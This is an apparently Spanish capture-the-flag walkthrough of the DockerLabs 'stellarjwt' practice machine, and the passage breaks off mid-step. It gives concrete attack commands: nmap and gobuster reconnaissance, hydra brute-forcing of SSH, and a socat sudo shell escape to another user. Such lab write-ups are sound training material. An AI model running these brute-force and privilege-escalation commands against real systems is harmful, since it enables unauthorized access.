Maquina: stallarjwt
Nivel: Facil
Proposito:
Objetivo:
Imagenes/Logo.png
Primero se descarga la maquina .zip vulnerable de la pagina dockerlab y lo descompremi con el comando unzip stallarjwt.zip y lo despliego con el comando: sudo bash auto_deploy.sh stellarjwt.tar
Imagenes/Capturas.png
Se procede a confirmar si tenemos activa la maquina vulnerable con un ping -c1 172.17.0.2
Imagesnes/Capturas_1.png
Con la herramienta de nmap buscaremos los puertos abiertos: sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt y encuento el puerto 22 SSH y el 80 http una posible pagina web
Imagesnes/Capturas_2.png
Con mi scrito perseonalizable extraigo los puetor importantes extractPorts allPorts.txt y con la herramienta de namp intento buscar mas informacion como versiones de los servicios que estan corriendo en los puertos
Imagesnes/Capturas_3.png
Al entrar a la pagina web no encontre informaciòn para poder atacar o alguna vulnerabilidad asi que procedo a hacer fuzzing en busca de mas informaciòn
Imagesnes/Capturas_4.png
Use la herramienta de gobuster con el comando gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -add-slash -b 403,404 -x .php,.html,.txt
y encontre:
/index.html 
/universe 
Imagesnes/Capturas_5.png
El index/htmll es la pagina principal
EL /universe: http://172.17.0.2/universe/ nos muestra una imagen
Imagesnes/Capturas_6.png
Descargue la imagen con: wget http://172.17.0.2/universe/universe.jpg y revise su metada con: exiftool universe.jpg pero no encontre nada importtante.
Imagesnes/Capturas_7.png
Al reviar el codigo fuente de la pagina pude notar un comentario diferente que no parecia un hash busque que significaba el nombre de la maquina y me aparecio que es una API y al investigar con chatgtp pude saber que parece ser un JSON Web Token (JWT)
Imagesnes/Capturas_8.png
Use un Encode: https://jwt.io/ que me dio el usuario: neptuno
Imagesnes/Capturas_9.png
EN la pagina pregunata ¿Qué astrónomo alemán descubrió Neptuno? Johann Gottfried Galle
Con esta informaciòn puedo intentar saber las credenciales de SSH
Cre con nano contraseña.txt las posibles contraseñas que puede ser el nombre de Johann Gottfried Galle ya que copie y pegue verificar si no hay espacios con el comando: cat -A contraseña.txt y utilice hydra -l neptuno -P contraseña.txt ssh://172.17.0.2 -t20 y me mostro las credenciales [22][ssh] host: 172.17.0.2   login: neptuno   password: Gottfried
Imagesnes/Capturas_10.png
Con las credenciales se gano acceso al servico de SSH y se procede a buscar una forma de escalar privilegios
Imagesnes/Capturas_11.png
Con el comando ls -la encontre un .txt con la contraseña de nasa: Eisenhower y denstro de este usuario con el comando sudo -l encontre que se puede escalar con: (elite) NOPASSWD: /usr/bin/socat  esta vulnerabilida la use con el comando:sudo -u elite /usr/bin/socat stdin exec:/bin/bash y pude comvertirmer en elite, ahora con sudo -l me muestra que pueda escalar con (root) NOPASSWD: /usr/bin/chown con el comando: 
